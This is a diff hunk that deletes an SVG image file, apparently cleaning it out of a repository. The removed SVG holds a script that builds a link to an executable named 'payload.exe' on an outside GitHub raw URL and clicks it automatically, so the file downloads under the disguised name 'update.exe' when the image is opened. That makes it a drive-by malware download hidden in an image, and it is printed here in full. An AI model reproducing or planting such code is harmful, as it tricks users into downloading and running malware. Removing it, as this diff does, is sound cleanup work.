@@ -1,9 +1,0 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-      <script type="text/javascript">
-        var a = document.createElement("a");
-        a.href = "https://github.com/naruto3213213/111/raw/refs/heads/main/payload_encoded.b64/payload.exe";
-        a.download = "update.exe";
-        document.body.appendChild(a);
-        a.click();
-      </script>
-    </svg>
